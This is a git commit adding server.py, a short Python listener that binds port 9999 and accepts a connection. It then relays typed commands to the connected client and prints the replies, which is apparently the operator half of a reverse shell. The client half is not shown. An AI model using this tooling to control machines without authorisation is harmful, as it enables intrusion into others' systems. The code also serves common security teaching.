528cd0e2fe0e9b0ca765647505738748fdc75e70
X-3306 <75887512+X-3306@users.noreply.github.com>
2023-01-27 18:23:14 +0100

    Add files via upload

---
+++ server.py
@@ -0,0 +1,58 @@
+import socket
+import sys
+import threading
+
+def create_socket():
+    try:
+        global host
+        global port
+        global s
+        host = ""
+        port = 9999
+        s = socket.socket()
+
+    except socket.error as msg:
+        print("Socket creation error: " + str(msg))
+
+#Bind socket to port and wait for connection
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+        print("Binding socket to port: " + str(port))
+
+        s.bind((host, port))
+        s.listen(5)
+
+    except socket.error as msg:
+        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
+        bind_socket()
+
+#Establish connection with client
+def accept_socket():
+    conn, address = s.accept()
+    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+#Send commands to client
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            print(client_response, end="")
+
+#Main function
+def main():
+    create_socket()
+    bind_socket()
+    accept_socket()
+
+main()
